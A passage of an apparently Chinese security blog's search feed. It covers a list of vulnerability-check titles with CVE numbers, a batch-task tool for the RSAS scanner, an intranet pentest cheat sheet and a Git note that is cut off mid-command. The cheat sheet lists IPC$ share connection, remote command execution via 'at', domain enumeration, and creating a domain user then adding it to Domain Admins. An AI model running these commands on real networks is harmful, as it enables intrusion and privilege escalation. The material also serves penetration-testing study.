“rtrlet”组件远程代码执行漏洞(CVE-2011-2653)"></a>2011-12-08 Novell ZENWorks Asset Management “rtrlet”组件远程代码执行漏洞(CVE-2011-2653)</h6><h6 id="2011-11-02-HP-OpenView-NNM-webappmon-exe参数远程代码执行漏洞-CVE-2011-3166"><a href="#2011-11-02-HP-OpenView-NNM-webappmon-exe参数远程代码执行漏洞-CVE-2011-3166" class="headerlink" title="2011-11-02 HP OpenView NNM webappmon.exe参数远程代码执行漏洞(CVE-2011-3166)"></a>2011-11-02 HP OpenView NNM webappmon.exe参数远程代码执行漏洞(CVE-2011-3166)</h6><h6 id="2011-11-02-HP-OPENVIEW-NNM-OV-DLL-OVBUILDPATH远程代码执行漏洞-CVE-2011-3167"><a href="#2011-11-02-HP-OPENVIEW-NNM-OV-DLL-OVBUILDPATH远程代码执行漏洞-CVE-2011-3167" class="headerlink" title="2011-11-02 HP OPENVIEW NNM OV.DLL _OVBUILDPATH远程代码执行漏洞(CVE-2011-3167)"></a>2011-11-02 HP OPENVIEW NNM OV.DLL _OVBUILDPATH远程代码执行漏洞(CVE-2011-3167)</h6><h6 id="2011-08-29-Apache-HTTP-Server畸形Range和Range-Request选项处理远程拒绝服务漏洞-CVE-2011-3192"><a href="#2011-08-29-Apache-HTTP-Server畸形Range和Range-Request选项处理远程拒绝服务漏洞-CVE-2011-3192" class="headerlink" title="2011-08-29 Apache HTTP Server畸形Range和Range-Request选项处理远程拒绝服务漏洞(CVE-2011-3192)"></a>2011-08-29 Apache HTTP Server畸形Range和Range-Request选项处理远程拒绝服务漏洞(CVE-2011-3192)</h6><h6 id="2011-07-04-vsftpd-2-3-4源程序软件包存在后门漏洞"><a href="#2011-07-04-vsftpd-2-3-4源程序软件包存在后门漏洞" class="headerlink" title="2011-07-04 vsftpd 2.3.4源程序软件包存在后门漏洞"></a>2011-07-04 vsftpd 2.3.4源程序软件包存在后门漏洞</h6><h6 id="2011-05-04-Indusoft-WebStudio-NTWebServer模块远程目录遍历漏洞-CVE-2011-1900"><a href="#2011-05-04-Indusoft-WebStudio-NTWebServer模块远程目录遍历漏洞-CVE-2011-1900" class="headerlink" title="2011-05-04 Indusoft WebStudio NTWebServer模块远程目录遍历漏洞(CVE-2011-1900)"></a>2011-05-04 Indusoft WebStudio NTWebServer模块远程目录遍历漏洞(CVE-2011-1900)</h6><h6 id="2011-04-13-Microsoft-Windows-SMB操作解析远程代码执行漏洞-MS11-020-CVE-2011-0661"><a href="#2011-04-13-Microsoft-Windows-SMB操作解析远程代码执行漏洞-MS11-020-CVE-2011-0661" class="headerlink" title="2011-04-13 Microsoft Windows SMB操作解析远程代码执行漏洞(MS11-020)(CVE-2011-0661)"></a>2011-04-13 Microsoft Windows SMB操作解析远程代码执行漏洞(MS11-020)(CVE-2011-0661)</h6><h6 id="2011-03-28-Zend-Server-Java-Bridge-“javamw-jar”服务远程代码执行漏洞"><a href="#2011-03-28-Zend-Server-Java-Bridge-“javamw-jar”服务远程代码执行漏洞" class="headerlink" title="2011-03-28 Zend Server Java Bridge “javamw.jar”服务远程代码执行漏洞"></a>2011-03-28 Zend Server Java Bridge “javamw.jar”服务远程代码执行漏洞</h6><h6 id="2011-01-19-Oracle-Enterprise-Manager-Grid-Control-JSP代码执行漏洞-CVE-2010-3600"><a href="#2011-01-19-Oracle-Enterprise-Manager-Grid-Control-JSP代码执行漏洞-CVE-2010-3600" class="headerlink" title="2011-01-19 Oracle Enterprise Manager Grid Control JSP代码执行漏洞(CVE-2010-3600)"></a>2011-01-19 Oracle Enterprise Manager Grid Control JSP代码执行漏洞(CVE-2010-3600)</h6><h6 id="2011-01-10-Cisco-交换机-路由器-no-login配置检测"><a href="#2011-01-10-Cisco-交换机-路由器-no-login配置检测" class="headerlink" title="2011-01-10 Cisco 交换机/路由器 no login配置检测"></a>2011-01-10 Cisco 交换机/路由器 no login配置检测</h6><h6 id="2010-12-16-Microsoft-SharePoint畸形SOAP请求远程代码执行漏洞-MS10-104-CVE-2010-3964"><a href="#2010-12-16-Microsoft-SharePoint畸形SOAP请求远程代码执行漏洞-MS10-104-CVE-2010-3964" class="headerlink" title="2010-12-16 Microsoft SharePoint畸形SOAP请求远程代码执行漏洞(MS10-104)(CVE-2010-3964)"></a>2010-12-16 Microsoft SharePoint畸形SOAP请求远程代码执行漏洞(MS10-104)(CVE-2010-3964)</h6><h6 id="2010-09-15-Microsoft-Windows-Print-Spooler服务不充分用户权限限制漏洞-MS10-061-CVE-2010-2729"><a href="#2010-09-15-Microsoft-Windows-Print-Spooler服务不充分用户权限限制漏洞-MS10-061-CVE-2010-2729" class="headerlink" title="2010-09-15 Microsoft Windows Print Spooler服务不充分用户权限限制漏洞(MS10-061)(CVE-2010-2729)"></a>2010-09-15 Microsoft Windows Print Spooler服务不充分用户权限限制漏洞(MS10-061)(CVE-2010-2729)</h6><h6 id="2010-08-11-Microsoft-Windows-SMB池溢出远程代码执行漏洞-MS10-054-CVE-2010-2550"><a href="#2010-08-11-Microsoft-Windows-SMB池溢出远程代码执行漏洞-MS10-054-CVE-2010-2550" class="headerlink" title="2010-08-11 Microsoft Windows SMB池溢出远程代码执行漏洞(MS10-054)(CVE-2010-2550)"></a>2010-08-11 Microsoft Windows SMB池溢出远程代码执行漏洞(MS10-054)(CVE-2010-2550)</h6><h6 id="2010-07-23-Novell-ZENworks-Configuration-Management-opcode-0x06远程缓冲区溢出"><a href="#2010-07-23-Novell-ZENworks-Configuration-Management-opcode-0x06远程缓冲区溢出" class="headerlink" title="2010-07-23 Novell ZENworks Configuration Management opcode 0x06远程缓冲区溢出"></a>2010-07-23 Novell ZENworks Configuration Management opcode 0x06远程缓冲区溢出</h6><h6 id="2010-05-13-HP-OpenView网络节点管理器getnnmdata-exe-MaxAge参数远程栈溢出漏洞-CVE-2010-1553"><a href="#2010-05-13-HP-OpenView网络节点管理器getnnmdata-exe-MaxAge参数远程栈溢出漏洞-CVE-2010-1553" class="headerlink" title="2010-05-13 HP OpenView网络节点管理器getnnmdata.exe MaxAge参数远程栈溢出漏洞(CVE-2010-1553)"></a>2010-05-13 HP OpenView网络节点管理器getnnmdata.exe MaxAge参数远程栈溢出漏洞(CVE-2010-1553)</h6><h6 id="2010-02-10-Microsoft-Windows-SMB内存破坏远程拒绝服务漏洞-MS10-012-CVE-2010-0021"><a href="#2010-02-10-Microsoft-Windows-SMB内存破坏远程拒绝服务漏洞-MS10-012-CVE-2010-0021" class="headerlink" title="2010-02-10 Microsoft Windows SMB内存破坏远程拒绝服务漏洞(MS10-012)(CVE-2010-0021)"></a>2010-02-10 Microsoft Windows SMB内存破坏远程拒绝服务漏洞(MS10-012)(CVE-2010-0021)</h6><h6 id="2010-02-10-Microsoft-Windows-SMB路径名远程溢出漏洞-MS10-012-CVE-2010-0020"><a href="#2010-02-10-Microsoft-Windows-SMB路径名远程溢出漏洞-MS10-012-CVE-2010-0020" class="headerlink" title="2010-02-10 Microsoft Windows SMB路径名远程溢出漏洞(MS10-012)(CVE-2010-0020)"></a>2010-02-10 Microsoft Windows SMB路径名远程溢出漏洞(MS10-012)(CVE-2010-0020)</h6><h6 id="2010-02-10-Microsoft-Windows-SMB空指针引用拒绝服务漏洞-MS10-012-CVE-2010-0022"><a href="#2010-02-10-Microsoft-Windows-SMB空指针引用拒绝服务漏洞-MS10-012-CVE-2010-0022" class="headerlink" title="2010-02-10 Microsoft Windows SMB空指针引用拒绝服务漏洞(MS10-012)(CVE-2010-0022)"></a>2010-02-10 Microsoft Windows SMB空指针引用拒绝服务漏洞(MS10-012)(CVE-2010-0022)</h6><h6 id="2010-02-10-Microsoft-Windows-SMB-NTLM认证不充分熵漏洞-MS10-012-CVE-2010-0231"><a href="#2010-02-10-Microsoft-Windows-SMB-NTLM认证不充分熵漏洞-MS10-012-CVE-2010-0231" class="headerlink" title="2010-02-10 Microsoft Windows SMB  NTLM认证不充分熵漏洞(MS10-012)(CVE-2010-0231)"></a>2010-02-10 Microsoft Windows SMB  NTLM认证不充分熵漏洞(MS10-012)(CVE-2010-0231)</h6><h6 id="2009-12-22-OpenEMR-Piwik-ofc-upload-image-php远程PHP代码执行漏洞-CVE-2009-4140"><a href="#2009-12-22-OpenEMR-Piwik-ofc-upload-image-php远程PHP代码执行漏洞-CVE-2009-4140" class="headerlink" title="2009-12-22 OpenEMR/Piwik ofc_upload_image.php远程PHP代码执行漏洞(CVE-2009-4140)"></a>2009-12-22 OpenEMR/Piwik ofc_upload_image.php远程PHP代码执行漏洞(CVE-2009-4140)</h6><h6 id="2009-09-08-Microsoft-Windows-SMB2报文协商越界内存引用漏洞-MS09-050-CVE-2009-3103"><a href="#2009-09-08-Microsoft-Windows-SMB2报文协商越界内存引用漏洞-MS09-050-CVE-2009-3103" class="headerlink" title="2009-09-08 Microsoft Windows SMB2报文协商越界内存引用漏洞(MS09-050)(CVE-2009-3103)"></a>2009-09-08 Microsoft Windows SMB2报文协商越界内存引用漏洞(MS09-050)(CVE-2009-3103)</h6><h6 id="2009-07-14-Oracle-Secure-Backup管理服务器绕过认证漏洞-CVE-2009-1977"><a href="#2009-07-14-Oracle-Secure-Backup管理服务器绕过认证漏洞-CVE-2009-1977" class="headerlink" title="2009-07-14 Oracle Secure Backup管理服务器绕过认证漏洞(CVE-2009-1977)"></a>2009-07-14 Oracle Secure Backup管理服务器绕过认证漏洞(CVE-2009-1977)</h6><h6 id="2009-05-20-NetDecision-TFTP-Server目录遍历漏洞［原理扫描］-CVE-2009-1730"><a href="#2009-05-20-NetDecision-TFTP-Server目录遍历漏洞［原理扫描］-CVE-2009-1730" class="headerlink" title="2009-05-20 NetDecision TFTP Server目录遍历漏洞［原理扫描］(CVE-2009-1730)"></a>2009-05-20 NetDecision TFTP Server目录遍历漏洞［原理扫描］(CVE-2009-1730)</h6><h6 id="2009-04-29-Symantec杀毒软件Intel-LANDesk-Common-Base-Agent服务任意代码执行漏洞-CVE-2009-1429"><a href="#2009-04-29-Symantec杀毒软件Intel-LANDesk-Common-Base-Agent服务任意代码执行漏洞-CVE-2009-1429" class="headerlink" title="2009-04-29 Symantec杀毒软件Intel LANDesk Common Base Agent服务任意代码执行漏洞(CVE-2009-1429)"></a>2009-04-29 Symantec杀毒软件Intel LANDesk Common Base Agent服务任意代码执行漏洞(CVE-2009-1429)</h6><h6 id="2009-04-29-Symantec杀毒软件Intel-Alert-Originator服务栈溢出漏洞-CVE-2009-1430"><a href="#2009-04-29-Symantec杀毒软件Intel-Alert-Originator服务栈溢出漏洞-CVE-2009-1430" class="headerlink" title="2009-04-29 Symantec杀毒软件Intel Alert Originator服务栈溢出漏洞(CVE-2009-1430)"></a>2009-04-29 Symantec杀毒软件Intel Alert Originator服务栈溢出漏洞(CVE-2009-1430)</h6><h6 id="2009-03-23-Openfire-Admin-Console认证绕过漏洞-CVE-2008-6508"><a href="#2009-03-23-Openfire-Admin-Console认证绕过漏洞-CVE-2008-6508" class="headerlink" title="2009-03-23 Openfire Admin Console认证绕过漏洞(CVE-2008-6508)"></a>2009-03-23 Openfire Admin Console认证绕过漏洞(CVE-2008-6508)</h6><h6 id="2009-01-14-Microsoft-Windows-SMB-NT-Trans请求缓冲区溢出漏洞-CVE-2008-4835-MS09-001"><a href="#2009-01-14-Microsoft-Windows-SMB-NT-Trans请求缓冲区溢出漏洞-CVE-2008-4835-MS09-001" class="headerlink" title="2009-01-14 Microsoft Windows SMB NT Trans请求缓冲区溢出漏洞(CVE-2008-4835)(MS09-001)"></a>2009-01-14 Microsoft Windows SMB NT Trans请求缓冲区溢出漏洞(CVE-2008-4835)(MS09-001)</h6><h6 id="2009-01-14-Microsoft-Windows-SMB-NT-Trans2请求远程拒绝服务及代码执行漏洞-CVE-2008-4835-MS09-001"><a href="#2009-01-14-Microsoft-Windows-SMB-NT-Trans2请求远程拒绝服务及代码执行漏洞-CVE-2008-4835-MS09-001" class="headerlink" title="2009-01-14 Microsoft Windows SMB NT Trans2请求远程拒绝服务及代码执行漏洞(CVE-2008-4835)(MS09-001)"></a>2009-01-14 Microsoft Windows SMB NT Trans2请求远程拒绝服务及代码执行漏洞(CVE-2008-4835)(MS09-001)</h6><h6 id="2008-10-23-目标主机存在Conficker蠕虫漏洞-CVE-2008-4250"><a href="#2008-10-23-目标主机存在Conficker蠕虫漏洞-CVE-2008-4250" class="headerlink" title="2008-10-23 目标主机存在Conficker蠕虫漏洞(CVE-2008-4250)"></a>2008-10-23 目标主机存在Conficker蠕虫漏洞(CVE-2008-4250)</h6><h6 id="2008-10-23-Windows-Server服务RPC请求缓冲区溢出漏洞-MS08-067-CVE-2008-4250"><a href="#2008-10-23-Windows-Server服务RPC请求缓冲区溢出漏洞-MS08-067-CVE-2008-4250" class="headerlink" title="2008-10-23 Windows Server服务RPC请求缓冲区溢出漏洞(MS08-067)(CVE-2008-4250)"></a>2008-10-23 Windows Server服务RPC请求缓冲区溢出漏洞(MS08-067)(CVE-2008-4250)</h6><h6 id="2008-10-14-mqqm-QMGetRemoteQueueName-远程堆溢出及信息泄露漏洞-MS08-065-KB951071-CVE-2008-3479"><a href="#2008-10-14-mqqm-QMGetRemoteQueueName-远程堆溢出及信息泄露漏洞-MS08-065-KB951071-CVE-2008-3479" class="headerlink" title="2008-10-14 mqqm!QMGetRemoteQueueName()远程堆溢出及信息泄露漏洞(MS08-065/KB951071)(CVE-2008-3479)"></a>2008-10-14 mqqm!QMGetRemoteQueueName()远程堆溢出及信息泄露漏洞(MS08-065/KB951071)(CVE-2008-3479)</h6><h6 id="2008-10-14-Microsoft-Host-Integration-Server-RPC远程命令执行漏洞-MS08-059-CVE-2008-3466"><a href="#2008-10-14-Microsoft-Host-Integration-Server-RPC远程命令执行漏洞-MS08-059-CVE-2008-3466" class="headerlink" title="2008-10-14 Microsoft Host Integration Server RPC远程命令执行漏洞(MS08-059)(CVE-2008-3466)"></a>2008-10-14 Microsoft Host Integration Server RPC远程命令执行漏洞(MS08-059)(CVE-2008-3466)</h6><h6 id="2008-09-16-趋势科技OfficeScan-cgiRecvFile-exe栈溢出漏洞-CVE-2008-2437"><a href="#2008-09-16-趋势科技OfficeScan-cgiRecvFile-exe栈溢出漏洞-CVE-2008-2437" class="headerlink" title="2008-09-16 趋势科技OfficeScan cgiRecvFile.exe栈溢出漏洞(CVE-2008-2437)"></a>2008-09-16 趋势科技OfficeScan cgiRecvFile.exe栈溢出漏洞(CVE-2008-2437)</h6><h6 id="2008-09-16-Microsoft-Windows-SMB-WRITE-ANDX处理拒绝服务漏洞-CVE-2008-4114-MS09-001"><a href="#2008-09-16-Microsoft-Windows-SMB-WRITE-ANDX处理拒绝服务漏洞-CVE-2008-4114-MS09-001" class="headerlink" title="2008-09-16 Microsoft Windows SMB WRITE_ANDX处理拒绝服务漏洞(CVE-2008-4114)(MS09-001)"></a>2008-09-16 Microsoft Windows SMB WRITE_ANDX处理拒绝服务漏洞(CVE-2008-4114)(MS09-001)</h6><h6 id="2008-03-24-ZyXEL-ZyWALL-Quagga及Zebra进程默认帐号口令漏洞-CVE-2008-1160"><a href="#2008-03-24-ZyXEL-ZyWALL-Quagga及Zebra进程默认帐号口令漏洞-CVE-2008-1160" class="headerlink" title="2008-03-24 ZyXEL ZyWALL Quagga及Zebra进程默认帐号口令漏洞(CVE-2008-1160)"></a>2008-03-24 ZyXEL ZyWALL Quagga及Zebra进程默认帐号口令漏洞(CVE-2008-1160)</h6><h6 id="2007-12-13-HP-OpenView网络节点管理器CGI栈溢出漏洞-CVE-2007-6204"><a href="#2007-12-13-HP-OpenView网络节点管理器CGI栈溢出漏洞-CVE-2007-6204" class="headerlink" title="2007-12-13 HP OpenView网络节点管理器CGI栈溢出漏洞(CVE-2007-6204)"></a>2007-12-13 HP OpenView网络节点管理器CGI栈溢出漏洞(CVE-2007-6204)</h6><h6 id="2007-12-11-Windows-Vista-SMBv2签名远程代码执行漏洞-MS07-063-KB942624-CVE-2007-5351"><a href="#2007-12-11-Windows-Vista-SMBv2签名远程代码执行漏洞-MS07-063-KB942624-CVE-2007-5351" class="headerlink" title="2007-12-11 Windows Vista SMBv2签名远程代码执行漏洞(MS07-063/KB942624)(CVE-2007-5351)"></a>2007-12-11 Windows Vista SMBv2签名远程代码执行漏洞(MS07-063/KB942624)(CVE-2007-5351)</h6><h6 id="2007-02-21-JBoss-Console-Web-Management直接请求身份验证绕过漏洞-CVE-2007-1036"><a href="#2007-02-21-JBoss-Console-Web-Management直接请求身份验证绕过漏洞-CVE-2007-1036" class="headerlink" title="2007-02-21 JBoss Console / Web Management直接请求身份验证绕过漏洞(CVE-2007-1036)"></a>2007-02-21 JBoss Console / Web Management直接请求身份验证绕过漏洞(CVE-2007-1036)</h6><h6 id="2006-09-26-OpenSSH复制块远程拒绝服务漏洞-CVE-2006-4924"><a href="#2006-09-26-OpenSSH复制块远程拒绝服务漏洞-CVE-2006-4924" class="headerlink" title="2006-09-26 OpenSSH复制块远程拒绝服务漏洞(CVE-2006-4924)"></a>2006-09-26 OpenSSH复制块远程拒绝服务漏洞(CVE-2006-4924)</h6><h6 id="2005-06-14-Microsoft-Windows入站SMB报文验证远程溢出漏洞-MS05-027-KB896422-CVE-2005-1206"><a href="#2005-06-14-Microsoft-Windows入站SMB报文验证远程溢出漏洞-MS05-027-KB896422-CVE-2005-1206" class="headerlink" title="2005-06-14 Microsoft Windows入站SMB报文验证远程溢出漏洞(MS05-027/KB896422)(CVE-2005-1206)"></a>2005-06-14 Microsoft Windows入站SMB报文验证远程溢出漏洞(MS05-027/KB896422)(CVE-2005-1206)</h6><h6 id="2004-08-06-Microsoft-Task-Scheduler远程任意代码执行漏洞-MS04-022-KB841873-CVE-2004-0212"><a href="#2004-08-06-Microsoft-Task-Scheduler远程任意代码执行漏洞-MS04-022-KB841873-CVE-2004-0212" class="headerlink" title="2004-08-06 Microsoft Task Scheduler远程任意代码执行漏洞(MS04-022/KB841873)(CVE-2004-0212)"></a>2004-08-06 Microsoft Task Scheduler远程任意代码执行漏洞(MS04-022/KB841873)(CVE-2004-0212)</h6><h6 id="2003-04-13-目标主机没有安装MS04-011-KB835732补丁-CVE-2003-0533"><a href="#2003-04-13-目标主机没有安装MS04-011-KB835732补丁-CVE-2003-0533" class="headerlink" title="2003-04-13 目标主机没有安装MS04-011/KB835732补丁(CVE-2003-0533)"></a>2003-04-13 目标主机没有安装MS04-011/KB835732补丁(CVE-2003-0533)</h6><h6 id="2002-10-28-Microsoft-SQL-Server-Webtasks权限提升漏洞-MS02-061-CVE-2002-1145"><a href="#2002-10-28-Microsoft-SQL-Server-Webtasks权限提升漏洞-MS02-061-CVE-2002-1145" class="headerlink" title="2002-10-28 Microsoft SQL Server Webtasks权限提升漏洞(MS02-061)(CVE-2002-1145)"></a>2002-10-28 Microsoft SQL Server Webtasks权限提升漏洞(MS02-061)(CVE-2002-1145)</h6><h6 id="1999-01-26-Microsoft-IIS-perl-exe泄漏物理路径-CVE-1999-0450"><a href="#1999-01-26-Microsoft-IIS-perl-exe泄漏物理路径-CVE-1999-0450" class="headerlink" title="1999-01-26 Microsoft IIS perl.exe泄漏物理路径(CVE-1999-0450)"></a>1999-01-26 Microsoft IIS perl.exe泄漏物理路径(CVE-1999-0450)</h6>]]></content>
      
      
      <categories>
          
          <category> 漏洞库 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 绿盟远程安全评估系统(RSAS)批量下任务工具</title>
      <link href="/article/tool-rsas-task.html"/>
      <url>/article/tool-rsas-task.html</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00 序言"></a>0x00 序言</h3><hr><blockquote><p>狐网风起云涌，演绎江湖恩怨情仇，狐网纷争，谁主沉浮。<br>南荒之地，寄居于网络供应商的安全猿，早已进入忘我状态。<br>只见五指来回交错，时而兰花指状，时而鼠标手状，不出半个时辰，印堂竟暗显油光，此等修炼方式，和传说中的武林秘籍《下任务》极为相似。</p></blockquote><hr><h3 id="0x01-工具介绍"><a href="#0x01-工具介绍" class="headerlink" title="0x01 工具介绍"></a>0x01 工具介绍</h3><p>Python+pyqt5编写，界面分离方式，采用模拟请求的方式实现，非官方数据接口，所有扫描器都能用。</p><hr><p>适用以下人群：</p><ul><li>用绿盟扫描器扫漏洞的</li><li>任务下到手抽筋心烦的</li><li>动不动就能把系统扫崩，无法周期扫描的</li></ul><hr><p>去其糟粕，保留四大核心功能，满足各位大侠的需求：</p><ul><li><p>1、全端口扫描</p></li><li><p>2、默认端口扫描</p></li><li><p>3、取消存活扫描</p></li><li><p>4、定义存活探测端口</p></li></ul><hr><h3 id="0x02-配置"><a href="#0x02-配置" class="headerlink" title="0x02 配置"></a>0x02 配置</h3><p>打开软件后会生成配置文件set.ini：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[扫描器地址]</span><br><span class="line">host = 127.0.0.1 #扫描器的IP地址</span><br><span class="line">port = 443 #扫描器的端口</span><br><span class="line">survival_port = 21,22,23,25,80,443,445,139,3389,6000 #自定义探测存活的端口</span><br><span class="line"></span><br><span class="line">[任务配置]</span><br><span class="line">系统名称|2011-1-1 11:11:11 #系统名称和设定的扫描时间，只填系统名称是立即扫描</span><br></pre></td></tr></table></figure><p>再次打开软件会生成资产文件夹Assets，资产文件夹下存放保存IP地址的txt文件,txt文件名需要以上边配置的系统名称命名，软件是直接打开配置文件里边的系统名称+txt，名称不一样，就找不到该文件了。</p><p>资产可以是很多个，配置里边只有一个。</p><p>比如，资产目录下有：北京.txt、黑龙江.txt、河南.txt、河北.txt，只想下北京的资产，立即扫描，那么就这么写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[任务配置]</span><br><span class="line">北京</span><br></pre></td></tr></table></figure><p>只想下北京、河南的资产，6月1号扫描，那么就这么写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[任务配置]</span><br><span class="line">北京|2019-6-1 00:00:00</span><br><span class="line">河南|2019-6-1 10:30:00</span><br></pre></td></tr></table></figure><p>txt里的IP地址是一行一个，这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.1.1.1</span><br><span class="line">2.2.2.2</span><br><span class="line">3.3.3.3</span><br></pre></td></tr></table></figure><p>下任务出了其他问题也没关系，同目录下会有log.txt可供参考。</p><h3 id="0x03-下载"><a href="#0x03-下载" class="headerlink" title="0x03 下载"></a>0x03 下载</h3><p>下载是Windows版本的，其他版本自行下载打包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">链接:https://pan.baidu.com/s/1FNwglqj7zXML76WGo4-ldw 提取码:jgmk</span><br></pre></td></tr></table></figure><p>源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/autoing/RSAS-Task-Release</span><br></pre></td></tr></table></figure><h3 id="0x04-效果"><a href="#0x04-效果" class="headerlink" title="0x04 效果"></a>0x04 效果</h3><p><img src="../do/images/tool/tool_rsas_task.gif" alt></p>]]></content>
      
      
      <categories>
          
          <category> 原创工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-内网</title>
      <link href="/article/pentest-Intranet.html"/>
      <url>/article/pentest-Intranet.html</url>
      
        <content type="html"><![CDATA[<h1 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h1><h2 id="IPC-涉及两个端口"><a href="#IPC-涉及两个端口" class="headerlink" title="IPC$涉及两个端口"></a>IPC$涉及两个端口</h2><p>139端口：用来验证</p><p>445端口：用来共享文件</p><p>查看当前的连接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use</span><br></pre></td></tr></table></figure><p>删除链接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use * del /y</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.123.100 del /y</span><br></pre></td></tr></table></figure><p>连接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.123.100\ipc$ admin /user:admin</span><br></pre></td></tr></table></figure><p>复制文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy c:\1.txt \\192.168.123.100\source\123.txt</span><br></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.123.100 18:00pm cmd /c &quot;whoami&quot;</span><br></pre></td></tr></table></figure><h1 id="dos命令"><a href="#dos命令" class="headerlink" title="dos命令"></a>dos命令</h1><p>查看所有域:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure><p>查看域所有计算机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain:domain</span><br></pre></td></tr></table></figure><p>查看局域网共享的设备：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure><p>查看共享的目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view \\192.168.123.100</span><br></pre></td></tr></table></figure><h1 id="域命令"><a href="#域命令" class="headerlink" title="域命令"></a>域命令</h1><table><thead><tr><th align="left">命令</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">net user /domain</td><td align="left">获取所有域用户列表</td></tr><tr><td align="left">net group /domain</td><td align="left">获取域用户组信息</td></tr><tr><td align="left">net group “domain admins” /domain</td><td align="left">获取管理员列表 （会返回控制器,返回管理员的账号）</td></tr><tr><td align="left">net user test /domain</td><td align="left">查看管理员登陆时间，密码过期时间，是否有登陆脚本，组分配等信息！</td></tr><tr><td align="left">net time /domain</td><td align="left">可以查看域时间，以及域服务器的名字</td></tr><tr><td align="left">net user test test /add /domain</td><td align="left">添加普通域用户</td></tr><tr><td align="left">net group “Domain Admins” test /add /domain</td><td align="left">将普通域用户提升为域管理员</td></tr><tr><td align="left">net accounts  /domain</td><td align="left">查询域密码策略</td></tr><tr><td align="left">whoami /all</td><td align="left">查询用户的权限</td></tr><tr><td align="left">ping 域名称</td><td align="left">获取域服务器的ip</td></tr><tr><td align="left">nbtstat -a 域名称</td><td align="left">获取域服务器的ip</td></tr><tr><td align="left">dsquery computer</td><td align="left">查看域里的计算机</td></tr><tr><td align="left">dsquery contact</td><td align="left">查看域里的联系人</td></tr><tr><td align="left">dsquery group</td><td align="left">查看域里的用户组</td></tr><tr><td align="left">dsquery user</td><td align="left">查看域用户</td></tr><tr><td align="left">dsquery subnet</td><td align="left">查看网段的划分</td></tr><tr><td align="left">dsquery server</td><td align="left">显示所有域控（域控制器）</td></tr><tr><td align="left">dsquery subnet</td><td align="left">查看域里的子网</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Git</title>
      <link href="/article/git.html"/>
      <url>/article/git.html</url>
      
        <content type="html"><![CDATA[<h3 id="Git的推送"><a href="#Git的推送" class="headerlink" title="Git的推送"></a>Git的推送</h3><h4 id="生成秘钥"><a href="#生成秘钥" class="headerlink" title="生成秘钥"></a>生成秘钥</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;webing@qq.com&quot;</span><br></pre></td></tr></table></figure><h4 id="创建Git仓库"><a href="#创建Git仓库" class="headerlink" title="创建Git仓库"></a>创建Git仓库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><h4 id="添加文件到仓库"><a href="#添加文件到仓库" class="headerlink" title="添加文件到仓库"></a>添加文件到仓库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add test.txt</span><br></pre></td></tr></table></figure><h4 id="添加所有文件到仓库"><a href="#添加所有文件到仓库" class="headerlink" title="添加所有文件到仓库"></a>添加所有文件到仓库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure><h4 id="添加说明"><a href="#添加说明" class="headerlink" title="添加说明"></a>添加说明</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m &quot;readme&quot;</span><br></pre></td></tr></table></figure><h4 id="关联仓库"><a href="#关联仓库" class="headerlink" title="关联仓库"></a>关联仓库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin 